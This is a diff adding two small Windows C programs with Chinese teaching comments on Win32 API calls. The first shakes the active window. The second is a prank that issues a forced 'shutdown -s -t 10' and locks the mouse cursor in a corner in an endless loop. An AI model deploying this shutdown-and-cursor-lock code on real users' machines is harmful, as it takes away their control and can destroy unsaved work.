@@ -1,0 +1,48 @@
+#include <stdio.h>
+#include <windows.h>	//看头文件的名字就知道这个的作用了
+int main(int argc, char *argv[])
+{
+	RECT rect;			//RECT是一个矩形结构体，相当于保存了一个矩形的四条边的坐标
+	HWND hwnd = NULL,oldhwnd = NULL;	//两个窗口句柄
+	int x,y,width,height;		//用来保存窗口横纵坐标和宽度、高度的变量
+	int i;						//这是一个循环变量
+	for(i=0;i<50;i++)	//循环50次，也可以是死循环，不过还是厚道点好
+	{
+		hwnd = GetForegroundWindow();	//今天的又一个API函数，获取活动窗口的句柄
+		if(hwnd!=oldhwnd)				//判断窗口句柄是不是改变了
+		{
+			GetWindowRect(hwnd,&rect);	//第三个API函数，获取指定窗口的位置
+			x = rect.left;				//拿到了窗口的横坐标，即左上角的点
+			y = rect.top;				//拿到了纵坐标
+			width = rect.right - x;		//窗口右边的坐标减去左边的就是窗口的宽度
+			height = rect.bottom - y;	//同理，下面的减去上面的，即高度
+			oldhwnd = hwnd;				//把刚刚获取的窗口句柄保存起来。
+		}
+		MoveWindow(hwnd,x-10,y,width,height,TRUE);	//向左移动了10像素，下同
+		Sleep(5);									//暂停5毫秒
+		MoveWindow(hwnd,x-10,y-10,width,height,TRUE);
+		Sleep(5);
+		MoveWindow(hwnd,x,y-10,width,height,TRUE);
+		Sleep(5);
+		MoveWindow(hwnd,x,y,width,height,TRUE);
+		Sleep(5);
+	}
+	return 0;
+}
+
+
+
+
+
+
+#include <stdio.h>
+#include <windows.h>
+
+int main(){
+	WinExec("shutdown -s -t 10",1); //注意，我可没有隐藏窗口
+	while(1){				//这是一个死循环
+		SetCursorPos(0,0);  //鼠标指针到0,0点了，也就是左上角
+		Sleep(1);           //暂停1毫秒，免得CPU太累
+	}
+	return 0;				//习惯上还是写上吧
+}
